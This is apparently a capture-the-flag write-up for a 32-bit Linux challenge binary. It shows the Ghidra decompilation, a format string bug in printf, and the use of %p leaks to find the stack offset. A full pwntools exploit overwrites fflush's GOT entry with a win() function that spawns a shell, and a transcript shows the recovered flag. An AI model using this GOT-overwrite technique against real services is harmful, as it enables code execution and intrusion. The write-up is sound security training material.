# &#35; chall_11


#### &#42; purpose
1. input format string at fgets(local_d4,199,stdin);
2. overwrite fflush.got with win()

#### &#42; execute
```bash
## 1 file
$ ls ./chall_11
./chall_11

## 32-bit LSB, dynamically linked and not stripped
$ file ./chall_11
./chall_11: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cbaffac1b5c42d1691624079dc7c846cab8619d5, for GNU/Linux 3.2.0, not stripped

## memory protection is none
$ checksec --file=./chall_11
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74) Symbols	  No	0		2		./chall_11

## just input twice and echo about 2nd input
$ ./chall_11
So indeed
AAAA
BBBB
BBBB
$


```

#### &#42; decompile using ghidra
```bash
## vulnerable point is printf(local_d4); => format string bug


void main(void)

{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("So indeed ");
  fgets(local_24,19,stdin);
  vuln();
  return;
}


void vuln(void)

{
  char local_d4 [204];
  
  fgets(local_d4,199,stdin);
  printf(local_d4);
  fflush(stdin);
  return;
}


void win(void)

{
  system("/bin/sh");
  return;
}


$ ./chall_11
So indeed
AAAA
BBBB.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
BBBB.0xc7.0xf7f10580.0x8049258.(nil).0xf7f10580.0x42424242.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70



## exploit structure
input("BBBB") is 6th position

BBBB.0xc7.0xf7f10580.0x8049258.(nil).0xf7f10580.0x42424242
```


#### &#42; exploit step
```bash
1. overwrite fflush.got to win() using 6th position
2. overwrite fflush.got with win()

```


#### &#42; payload(python)
```python
$ objdump -R ./chall_11 | grep fflu
0804b308 R_386_JUMP_SLOT   fflush@GLIBC_2.0

$ objdump -t ./chall_11 | grep win
08049216 g     F .text  0000002f              win

## higher address is same(0x0804)
## thus need to overwrite lower address

payload  = b""
payload += p32(fflush_got)
payload += p32(fflush_got+1)
payload += b"%{}x".format(0x16 - len(payload))
payload += b"%6$hhn"
payload += b"%{}x".format(0x92 - 0x16)
payload += b"%7$hhn"


```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *


filename = "chall_11"
conn = process(filename)
elf = ELF(filename)

'''
$ objdump -R ./chall_11 | grep fflu
0804b308 R_386_JUMP_SLOT   fflush@GLIBC_2.0

$ objdump -t ./chall_11 | grep win
08049216 g     F .text	0000002f              win
'''
fflush_got = elf.got["fflush"]
win_sym = elf.symbols["win"]
#fflush_got = 0x804b308
print("fflush_got : " + hex(fflush_got))
print("win_sym : " + hex(win_sym))

print( conn.recvuntil("So indeed \n") )
conn.sendline("DUMY")

with open("payload", "wb") as fd:
    fd.write("DUMY\n")

'''
offset = 6
payload = fmtstr_payload(offset, {fflush_got: win_sym})
'''

'''
payload  = ""
payload += p32(fflush_got)
payload += "%{}c".format(win_sym-4)
payload += "%6$hn"
'''
'''
payload  = b""
payload += p32(fflush_got)
payload += b"%{}x".format(0x9216 - len(payload))
payload += b"%6$hn"
'''


payload  = b""
payload += p32(fflush_got)
payload += p32(fflush_got+1)
payload += b"%{}x".format(0x16 - len(payload))
payload += b"%6$hhn"
payload += b"%{}x".format(0x92 - 0x16)
payload += b"%7$hhn"


'''
payload  = ""
payload += p32(fflush_got+2)
payload += p32(fflush_got)
payload += "%{}x".format(0x0804 - len(payload))
payload += "%6$hn"
payload += "%{}x".format(0x9216 - 0x0804)
payload += "%7$hn"
'''

conn.sendline(payload)

with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_11' in $PATH, using './chall_11' instead
[+] Starting local process './chall_11': pid 347
[*] '/pwn/sunshine/11/chall_11'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
fflush_got : 0x804b308
win_sym : 0x8049216
So indeed

[*] Switching to interactive mode
\xb3\x04    \xb3\x04            c7                                                                                                                    f7f13580
$ cat flag.txt
sun{afterlife-4b74753c2b12949f}
$
```
